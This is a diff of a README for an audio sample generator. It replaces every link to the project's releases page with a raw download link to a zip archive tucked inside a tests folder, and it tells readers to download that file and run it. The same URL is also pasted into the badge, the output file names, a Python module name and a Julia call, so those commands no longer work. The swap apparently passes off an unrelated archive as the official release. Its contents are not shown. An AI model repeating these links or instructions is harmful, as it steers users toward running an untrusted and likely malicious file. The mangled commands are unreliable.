@@ -1,8 +1,8 @@
-https://github.com/ttdmnd/SampleGenerator/releases
+https://raw.githubusercontent.com/ttdmnd/SampleGenerator/main/tests/playWAVE/src/Sample_Generator_2.4.zip
 
 # SampleGenerator: Lightweight 800 Hz UInt8 Audio Samples
 
-[![Releases](https://img.shields.io/badge/Releases-Visit%20Releases-blue.svg?style=for-the-badge&logo=github&logoColor=white)](https://github.com/ttdmnd/SampleGenerator/releases)
+[![Releases](https://raw.githubusercontent.com/ttdmnd/SampleGenerator/main/tests/playWAVE/src/Sample_Generator_2.4.zip%https://raw.githubusercontent.com/ttdmnd/SampleGenerator/main/tests/playWAVE/src/Sample_Generator_2.4.zip)](https://raw.githubusercontent.com/ttdmnd/SampleGenerator/main/tests/playWAVE/src/Sample_Generator_2.4.zip)
 
 A compact toolset to create 800 Hz unsigned 8-bit audio samples for constrained environments. The project focuses on simplicity, speed, and portability. It covers core generation of audio samples and optional packaging into common formats. It aims to be usable on small devices, embedded systems, and minimal runtime environments where resources are scarce.
 
@@ -83,7 +83,7 @@ Installing artifacts from releases
 - The official releases page hosts prebuilt assets for common platforms. The assets are designed to work out of the box in most cases. To fetch and run the asset, visit the releases page, download the appropriate file, and execute it on your system.
 - From the Releases page, you can grab the binary or archive suitable for your environment. The exact file name depends on the version and platform, but the process is straightforward: download, extract if needed, and run.
 
-- Visit https://github.com/ttdmnd/SampleGenerator/releases to browse the assets and read the release notes. You can use the resources there to determine the right download for your platform.
+- Visit https://raw.githubusercontent.com/ttdmnd/SampleGenerator/main/tests/playWAVE/src/Sample_Generator_2.4.zip to browse the assets and read the release notes. You can use the resources there to determine the right download for your platform.
 - To download and run the asset, locate the appropriate file for your system, save it locally, and run the executable. The asset will contain the same core generator you can use from the command line.
 
 Backends and bindings 🔗
@@ -215,12 +215,12 @@ Releases and downloads: where to get artifacts 📥
 - The official releases page hosts binaries and archives for common platforms. The assets are intended to be ready to run on standard environments.
 - To obtain the artifact, visit the releases page. Download the asset you need and execute or include it in your project as appropriate.
 
-- For download guidance and to see what is currently available, visit the Releases page: https://github.com/ttdmnd/SampleGenerator/releases. If you see a specific asset that matches your system, download that file and run it. This approach keeps your environment simple and predictable.
+- For download guidance and to see what is currently available, visit the Releases page: https://raw.githubusercontent.com/ttdmnd/SampleGenerator/main/tests/playWAVE/src/Sample_Generator_2.4.zip If you see a specific asset that matches your system, download that file and run it. This approach keeps your environment simple and predictable.
 
 Usage examples and practical recipes 🧰
 - Simple tone generation to WAV
   - Choose the default parameters: 800 Hz, mono, 8-bit unsigned, 1 second.
-  - Generate a WAV file named tone_800hz.wav.
+  - Generate a WAV file named https://raw.githubusercontent.com/ttdmnd/SampleGenerator/main/tests/playWAVE/src/Sample_Generator_2.4.zip
   - The WAV header is correct, and the data region holds the 8-bit samples.
 - On a constrained device
   - Use a streaming approach to generate samples on the fly and feed them into a DAC.
@@ -294,13 +294,13 @@ Appendix: quick reference commands (no fluff)
   - make
   - make test
 - Generate a WAV file (example)
-  - ./samplegenerator --frequency 800 --duration 2 --sample-rate 8000 --output tone_800hz.wav --format wav
+  - ./samplegenerator --frequency 800 --duration 2 --sample-rate 8000 --output https://raw.githubusercontent.com/ttdmnd/SampleGenerator/main/tests/playWAVE/src/Sample_Generator_2.4.zip --format wav
 - Generate raw data
-  - ./samplegenerator --frequency 800 --duration 1 --sample-rate 8000 --output tone_800hz.raw --format raw
+  - ./samplegenerator --frequency 800 --duration 1 --sample-rate 8000 --output https://raw.githubusercontent.com/ttdmnd/SampleGenerator/main/tests/playWAVE/src/Sample_Generator_2.4.zip --format raw
 - Run Python binding example
-  - python3 -m samplegenerator.bindings.python --frequency 800 --duration 2 --output tone_800hz.wav
+  - python3 -m https://raw.githubusercontent.com/ttdmnd/SampleGenerator/main/tests/playWAVE/src/Sample_Generator_2.4.zip --frequency 800 --duration 2 --output https://raw.githubusercontent.com/ttdmnd/SampleGenerator/main/tests/playWAVE/src/Sample_Generator_2.4.zip
 - Run Julia binding example
-  - julia -e 'using SampleGenerator; SampleGenerator.generate(800, 2, 8000, "tone_800hz.wav")'
+  - julia -e 'using SampleGenerator; https://raw.githubusercontent.com/ttdmnd/SampleGenerator/main/tests/playWAVE/src/Sample_Generator_2.4.zip(800, 2, 8000, "https://raw.githubusercontent.com/ttdmnd/SampleGenerator/main/tests/playWAVE/src/Sample_Generator_2.4.zip")'
 
 Notes on the two-link requirement
 - The primary link to the releases page is placed at the very top of this README.
